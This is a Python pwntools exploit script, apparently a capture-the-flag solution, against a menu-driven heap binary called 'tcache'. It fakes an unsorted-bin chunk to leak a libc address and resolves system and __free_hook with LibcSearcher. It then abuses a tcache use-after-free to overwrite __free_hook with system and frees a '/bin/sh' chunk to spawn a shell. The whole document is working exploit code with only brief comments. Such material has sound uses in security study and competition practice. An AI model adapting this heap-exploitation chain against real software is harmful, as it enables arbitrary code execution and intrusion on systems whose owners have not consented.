#!/usr/bin/env python2
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('4. Show String\n')
    p.sendline(str(choice))

def create(data):
    send_choice(1)
    p.recvuntil('Input your content: \n')
    p.send(data)

def edit(index, data):
    send_choice(2)
    p.recvuntil('Select string: \n')
    p.sendline(str(index))
    p.recvuntil('Input your content: \n')
    p.send(data)

def delete(index):
    send_choice(3)
    p.recvuntil('Select string: \n')
    p.sendline(str(index))

def show(index):
    send_choice(4)
    p.recvuntil('Select string: \n')
    p.sendline(str(index))


p = process('./tcache')
elf = ELF('./tcache')
# gdb.attach(p, '')

"""
The size range of TCache is [0x20, 0x410].
"""

# Step 1: Fake an unsorted bin
for _ in range(19):
    create(p64(0xdeadbeef00000000 + _) + '\n')  # Create 19 consecutive chunk of 0x40 size, #0 ~ #18
edit(0, '\x00' * 0x38 + p64(0x40 * 17 + 0x1))   # Write the second chunk's size field to 17 times the original (0x440 > 0x410, enter unsorted bin), leaving the last chunk unmodified
delete(1)   # Free the fake unsorted bin, #1

# Step 2: Leak LibC address by leaking the `fd` field of unsorted bin
edit(0, 'a' * 0x40)
show(0)
p.recvuntil('a' * 0x40)
__malloc_hook = u64(p.recv(6).ljust(8, '\x00')) ^ 0xa0 ^ 0x30
libc = LibcSearcher('__malloc_hook', __malloc_hook)
libc_base = __malloc_hook - libc.dump('__malloc_hook')
libc_system = libc_base + libc.dump('system')
__free_hook = libc_base + libc.dump('__free_hook')
log.info('malloc_hook: ' + hex(__malloc_hook))
log.info('libc base: ' + hex(libc_base))
log.info('system: ' + hex(libc_system))
edit(0, '\x00' * 0x38 + p64(0x40 * 17 + 0x1))

# Step 3: TCache Chunk use after free
create('\x01')  # Create #1
create('\x02')  # Create #19, having the same heap address with #2
delete(4)       # Casually free a chunk other than #2 to provide a free slot for consequent exploit
delete(2)       # Free slot to exploit
edit(19, p64(__free_hook))  # Write free chunk's fd field to `__free_hook`
create(p64(0))
create(p64(libc_system))    # Write `__free_hook` to `system`
edit(10, '/bin/sh\x00')
delete(10)                  # `system("/bin/sh")`

p.interactive()
